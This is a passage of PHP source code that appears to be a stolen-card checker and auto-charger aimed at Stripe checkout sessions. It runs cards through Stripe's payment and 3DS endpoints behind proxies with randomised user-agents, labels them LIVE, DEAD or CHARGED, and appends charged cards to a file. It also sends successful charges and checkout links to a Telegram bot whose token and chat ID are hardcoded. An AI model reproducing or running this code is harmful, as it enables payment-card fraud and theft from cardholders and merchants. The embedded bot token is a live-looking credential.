        } elseif (strpos($pajax, 'security code')!== false) {
        echo '<small><span class="badge badge-warning">#LIVE</span> '.$cards.' » <span class="badge badge-dark">'.$result.' '.$ip.'</span></small><br>';
        } elseif (strpos($httpcode, '403') !== false) {
        echo '<small><span class="badge badge-danger">#DEAD</span> '.$cards.' » <span class="badge badge-dark">Your card was declined. '.$ip.' ['.$httpcode.']</span></small><br>';
        } elseif (strpos($pajax, 'address information') !== false) {
        $retry++;
        goto again;
        } elseif (strpos($pajax, 'card security check') !== false) {
        $retry++;
        goto again;
        } elseif (strpos($pajax, 'empty string') !== false) {
        $retry++;
        goto again;
        } elseif (strpos($pajax, 'cannot complete transaction') !== false) {
        $retry++;
        goto again;
        } elseif (strpos($authen, 'empty string')!== false) {
        echo '<small><span class="badge badge-danger">#DEAD</span> '.$cards.' » <span class="badge badge-dark">OTP detected. '.$ip.' ['.$httpcode.']</span></small><br>';
        } elseif (strpos($pintent, 'Your card was declined.')!== false) {
        echo '<small><span class="badge badge-danger">#DEAD</span> '.$cards.' » <span class="badge badge-dark">Your card was declined. '.$ip.' ['.$httpcode.']</span></small><br>';
        } else {
        echo '<small><span class="badge badge-danger">#DEAD</span> '.$cards.' » <span class="badge badge-dark">'.$result.' '.$ip.' ['.$httpcode.']</span></small><br>';
        }
        
        curl_close($curl);
        unset($curl);
        unlink("".$zauth."/COOKIE/".$inst['cookie']."");


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/3ds2/authenticate');
if (!empty($proxy)) {
    curl_setopt($ch, CURLOPT_PROXY, $proxy);
    if (!empty($proxyauth)) {
        curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyauth);
    }
}
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'accept: application/json';
$headers[] = 'content-type: application/x-www-form-urlencoded';
$headers[] = 'sec-ch-ua-mobile: ?1';
$headers[] = 'save-data: on';
$headers[] = 'User-agent: Mozilla/5.0 (Linux; Android 11; M'.rand(11,99).'G) AppleWebKit/'.rand(11,99).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/'.rand(11,99).'.0.0.0 Mobile Safari/'.rand(11,99).'.'.rand(11,99).'';
$headers[] = 'sec-ch-ua-platform: "Android"';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookies);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookies);
curl_setopt($ch, CURLOPT_COOKIESESSION, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'source='.$three_d.'&browser=%7B%22fingerprintAttempted%22%3Atrue%2C%22fingerprintData%22%3A%22eyJ0aHJlZURTU2VydmVyVHJhbnNJRCI6ImY2NjQ4NWVmLTQ1ZjItNDEyZi05Y2I3LWE5ZGFhMTE0MTY2ZCJ9%22%2C%22challengeWindowSize%22%3Anull%2C%22threeDSCompInd%22%3A%22Y%22%2C%22browserJavaEnabled%22%3Afalse%2C%22browserJavascriptEnabled%22%3Atrue%2C%22browserLanguage%22%3A%22en-GB%22%2C%22browserColorDepth%22%3A%2224%22%2C%22browserScreenHeight%22%3A%22851%22%2C%22browserScreenWidth%22%3A%22393%22%2C%22browserTZ%22%3A%22-480%22%2C%22browserUserAgent%22%3A%22Mozilla%2F5.0+(Linux%3B+Android+11%3B+M'.rand(11,99).'G)+AppleWebKit%2F'.rand(111,999).'.'.rand(11,99).'+(KHTML%2C+like+Gecko)+Chrome%2F'.rand(11,99).'.0.0.0+Mobile+Safari%2F'.rand(111,999).'.'.rand(11,99).'%22%7D&one_click_authn_device_support[hosted]=false&one_click_authn_device_support[same_origin_frame]=false&one_click_authn_device_support[spc_eligible]=false&one_click_authn_device_support[webauthn_eligible]=true&one_click_authn_device_support[publickey_credentials_get_allowed]=true&key='.$pk.'');
$authenticate = curl_exec($ch);
curl_close($ch);



$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_intents/'.$pi.'?key='.$pk.'&is_stripe_sdk=false&client_secret='.$client_secret.'');
if (!empty($proxy)) {
    curl_setopt($ch, CURLOPT_PROXY, $proxy);
    if (!empty($proxyauth)) {
        curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyauth);
    }
}
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array();
$headers[] = 'accept: application/json';
$headers[] = 'content-type: application/x-www-form-urlencoded';
$headers[] = 'sec-ch-ua-mobile: ?1';
$headers[] = 'save-data: on';
$headers[] = 'User-agent: Mozilla/5.0 (Linux; Android 11; M'.rand(11,99).'G) AppleWebKit/'.rand(11,99).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/'.rand(11,99).'.0.0.0 Mobile Safari/'.rand(11,99).'.'.rand(11,99).'';
$headers[] = 'sec-ch-ua-platform: "Android"';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookies);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookies);
curl_setopt($ch, CURLOPT_COOKIESESSION, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$final = curl_exec($ch);
$dcode2 = json_decode($final)->last_payment_error->decline_code;
$msg = json_decode($final)->last_payment_error->message;
$status = g($final, '"status": "','"');
$dcode = g($final, '"decline_code": "','"');
curl_close($ch);
sleep(5);

//* Start of getting BIN Information *//

// Get the first 6 digits (BIN) of the credit card number
$bin = substr($credit_card, 0, 6);

// Lookup the BIN database from https://binlist.net/ with 5 retries
$max_attempts = 3; // maximum number of attempts to make
$attempt = 0; // current attempt number

$binlist_response = false;

while(!$binlist_response && $attempt <= $max_attempts) {
    $binlist_api_url = "https://lookup.binlist.net/" . $cc;
    $binlist_response = @file_get_contents($binlist_api_url); // use @ to suppress errors
    $binlist_data = json_decode($binlist_response, true);

    //if(!empty($binlist_data)) {
        // data found, break out of the loop
        //break;
    //}

    // increment attempt counter
    $attempt++;

    // wait for 1 second before sending the next request
    //sleep(1);
}

// check if valid data was found
if(!empty($binlist_data)) {
    $find_cc_country = isset($binlist_data['country']['alpha2']) ? $binlist_data['country']['alpha2'] : '';
    $cctype = isset($binlist_data['type']) ? $binlist_data['type'] : '';
    $find_bank_name = isset($binlist_data['bank']['name']) ? $binlist_data['bank']['name'] : '';

    if(!empty($find_cc_country)){
        $cc_country = "<span class='badge badge-secondary'>$find_cc_country</span>";
    }
    if(!empty($find_bank_name)){
        $bank_name = "<span class='badge badge-secondary'>$find_bank_name</span>";
    }
} else {
    // no valid data found after maximum attempts
    // handle error here, e.g. display an error message
}


// Check if the input is a CVV or CCN
#$cctype = (preg_match('/^\d{3,4}$/', $cc)) ? 'CVV' : ((preg_match('/^\d{12,19}$/', $cc)) ? 'CCN' : 'Unknown');

// Check if the card type is debit or credit
if(strtolower($cctype) == 'debit'){
  $cctype = '<span class="badge badge-secondary">Debit</span>';
} else if(strtolower($cctype) == 'credit'){
  $cctype = '<span class="badge badge-secondary">Credit Card</span>';
} else {
  $cctype = '';
}

// Check the card type
if (preg_match('/^4[0-9]{12}(?:[0-9]{3})?$/', $cc)) {
    $scheme = '<span class="badge badge-secondary">Visa</span>';
} elseif (preg_match('/^5[1-5][0-9]{14}$/', $cc)) {
    $scheme = '<span class="badge badge-secondary">Mastercard</span>';
} elseif (preg_match('/^3[47][0-9]{13}$/', $cc)) {
    $scheme = '<span class="badge badge-secondary">American Express</span>';
} elseif (preg_match('/^6(?:011|5[0-9][0-9])[0-9]{12}$/', $cc)) {
    $scheme = '<span class="badge badge-secondary">Discover</span>';
} elseif (preg_match('/^(?:2131|1800|35\d{3})\d{11}$/', $cc)) {
    $scheme = '<span class="badge badge-secondary">JCB</span>';
} elseif (preg_match('/^3(?:0[0-5]|[68][0-9])[0-9]{11}$/', $cc)) {
    $scheme = '<span class="badge badge-secondary">Diners Club</span>';
} elseif (preg_match('/^(62|88)\d{16}$/', $cc)) {
    $scheme = '<span class="badge badge-secondary">UnionPay</span>';
} elseif (preg_match('/^(5[06789]|6)[0-9]{10,17}$/', $cc)) {
    $scheme = '<span class="badge badge-secondary">Maestro</span>';
} elseif (preg_match('/^4(026|17500|405|508|844|91[37])/', $cc)) {
    $scheme = '<span class="badge badge-secondary">Visa Electron</span>';
} elseif (preg_match('/^6[0-9]{15}$/', $cc)) {
    $scheme = '<span class="badge badge-secondary">RuPay</span>';
} else {
    $scheme = '';
}

#############SET DESTINATION OF YOUR TG BOT
$domain = $_SERVER['HTTP_HOST']; // give you the full URL of the current page that's being accessed
$botToken = urlencode('6282804958:AAEI3z75FI5QJypAyhS1zmqFAawE4ZTD0_o');
$chatID = urlencode('-987077078');
$amttt = intval($amttt)/100;

#############SEND TO TG BOT WHEN CHARGED
$charged_message = "Successful Checkout\r\n\nBIN:\r\n$card\r\nSuccess URL:\r\n".urldecode($success)."\r\nAmount: ".strtoupper($currency)."$amttt\r\n\nChecked from:\r\n$domain";
$sendcharged = 'https://api.telegram.org/bot'.$botToken.'/sendMessage?chat_id='.$chatID.'&text='.urlencode($charged_message).'';

#############SEND TO TG BOT WHEN INSUFFBAL
$insuf_message = "Insufficient Funds\r\n\nBIN: $card\r\nAmount to bill: $amttt\r\nStripe Checkout link:\r\n".urldecode($colink)."\r\n\nChecked from:\r\n$domain";
$sendinsuff = 'https://api.telegram.org/bot'.$botToken.'/sendMessage?chat_id='.$chatID.'&text='.urlencode($insuf_message).'';
    
#############BOT RETRY TO SEND IF ITS NOT WORKS
$max_retries = 3;
$num_retries = 0;
$sendchargedtotg = false;
$sendinsufftotg = false;

/////////===================/////////////////
if (strpos($final, '"status": "succeeded"')) {
    while (!$sendchargedtotg && $num_retries < $max_retries) {
    $sendchargedtotg = @file_get_contents($sendcharged);
    $num_retries++;
    echo ''.$myip.'<span class="badge badge-success"><b>#CHARGED</b></span> <font class="text-white"><b>'.$cc.'|'.$mm.'|'.$yy.'</b></font>  '.$scheme.''.$cctype.''.$bank_name.''.$cc_country.'<font class="text-white"><br>➤ The payment transaction has been successfully processed 💰✅<br>➤ Amount: '.strtoupper($currency).''.$amttt.'<br>➤ Receipt: <span style="background-color: white; color: green;" class="badge"><a href="'.$success.'"  target="_blank"><b>'.$success.'</b></a></span><br>➤ Checked from: <b>'.$domain.'</b></font><br>';
    fwrite(fopen('auto-charged-ccs.txt', 'a'), $card."\r\n");
    }
exit;
}
elseif(strpos($final, '"insufficient_funds"')) {
 echo "$myip<span class='badge badge-warning'>#LIVE</span> <font class='text-white'>$card</font> $scheme$cctype$bank_name$cc_country <span style='background-color: white; color: red;' class='badge'>insufficient_funds $status 💸❌</span><br>";
}
elseif(strpos($ppage2, '"insufficient_funds"')) {
 echo "$myip<span class='badge badge-warning'>#LIVE</span> <font class='text-white'>$card</font> $scheme$cctype$bank_name$cc_country <span style='background-color: white; color: red;' class='badge'>insufficient_funds $status 💸❌</span><br>";
}
elseif(strpos($pm, '"insufficient_funds"')) {
 echo "$myip<span class='badge badge-warning'>#LIVE</span> <font class='text-white'>$card</font> $scheme$cctype$bank_name$cc_country <span style='background-color: white; color: red;' class='badge'>insufficient_funds $status 💸❌</span><br>";
}
elseif(strpos($ppage2, '"type": "intent_confirmation_challenge"')){
   
    echo "$myip<span class='badge badge-danger'>DIE</span> <font class='text-white'>$card</font> $scheme$cctype$bank_name$cc_country <span style='background-color: white; color: red;' class='badge'>Blocked by CAPTCHA (change your proxy)</span><br>";
}
elseif($sessionstatus === 'This Checkout Session is no longer active.'){
    echo "$myip<span class='badge badge-danger'>DIE</span> <font class='text-white'>$card</font> $scheme$cctype$bank_name$cc_country <span style='background-color: white; color: red;' class='badge'>Your stripe checkout link is expired or maybe paid already.</span><br>";
}
elseif($status == "requires_action"){
    echo "$myip<span class='badge badge-danger'>DIE</span> <font class='text-white'>$card</font> $scheme$cctype$bank_name$cc_country <span style='background-color: white; color: red;' class='badge'>3DS Site [$dcode : $status]</span><br>";
}
elseif(strpos($ppage2, '"status": "requires_action"')){
    echo "$myip<span class='badge badge-danger'>DIE</span> <font class='text-white'>$card</font> $scheme$cctype$bank_name$cc_country <span style='background-color: white; color: red;' class='badge'>3DS Site [$dcode : $status]</span><br>"; 
}
elseif(strpos($ppage2, '"decline_code": "generic_decline"')){
    echo "$myip<span class='badge badge-danger'>DIE</span> <font class='text-white'>$card</font> $scheme$cctype$bank_name$cc_country <span style='background-color: white; color: red;' class='badge'>generic_decline</span><br>"; 
    
}
elseif(strpos($pm, '"decline_code": "generic_decline"')){
    echo "$myip<span class='badge badge-danger'>DIE</span> <font class='text-white'>$card</font> $scheme$cctype$bank_name$cc_country <span style='background-color: white; color: red;' class='badge'>generic_decline</span><br>"; 
}
elseif(strpos($ppage2, '"message": "An error has occurred confirming the Checkout Session."')){
    echo "$myip<span class='badge badge-danger'>DIE</span> <font class='text-white'>$card</font> $scheme$cctype$bank_name$cc_country <span style='background-color: white; color: red;' class='badge'><b>Payment Failed - CHECK YOUR PK/CS/EMAIL</b></span><br>";
    
    
}
else {
echo "$myip<span class='badge badge-danger'>DIE</span> <font class='text-white'>$card</font> $scheme$cctype$bank_name$cc_country <span style='background-color: white; color: red;' class='badge'>Payment failed [$code $decline_code $status $msg $dcode2 $message $dcode]</span><br>"; 
    
    
}

// DELETE COOKIES AT IBA PANG MGA LIBAG
if (is_file($cookies) && is_writable($cookies)) {
    unlink($cookies);
    unset($ch);
    flush();
    ob_flush();
    ob_end_flush();
}

// DELETE ALL TYPE OF FILES SA COOKIES FOLDER
$dir = getcwd() . DIRECTORY_SEPARATOR . "cookies" . DIRECTORY_SEPARATOR;
$files = glob($dir . "*"); // get all files in the directory

foreach($files as $file) {
    if(is_file($file)) { // make sure it's a file and not a directory
        unlink($file); // delete the file
    }
}

?>